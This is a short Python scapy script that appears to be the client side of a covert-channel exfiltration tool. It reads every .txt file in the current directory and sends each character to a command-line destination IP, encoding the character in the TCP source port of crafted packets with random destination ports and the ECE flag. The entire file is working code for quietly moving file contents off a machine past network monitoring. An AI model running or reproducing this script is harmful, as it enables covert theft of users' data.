import sys
from scapy.all import *

packet = None

# Client process usage
def proc_usage():
	if len(sys.argv) != 2:
		print ("Usage:", sys.argv[0], "destination_ip")
		sys.exit()

# Create the packet to transmit
def craft_packet(character):
	global packet
	global destination_addr
	destination_addr = str(sys.argv[1])
	char = ord(character) # covert character to decimal value
	packet=IP(dst=destination_addr)/TCP(sport=char, dport=RandNum(0, 65535), flags="E")
	return packet

# Read data from file and send to destination
def client_process():
    #while True:
        files = [f for f in os.listdir('.') if os.path.isfile(f)]
        for f in files:
            if '.txt' in os.path.splitext(f)[1]:
                try:
                    with open(f, 'r') as s:
                        for l in s:
                            for char in l:
                                new_packet = craft_packet(char)
                                send(new_packet)
                except UnicodeDecodeError:
                    pass

# Main
proc_usage()
client_process()
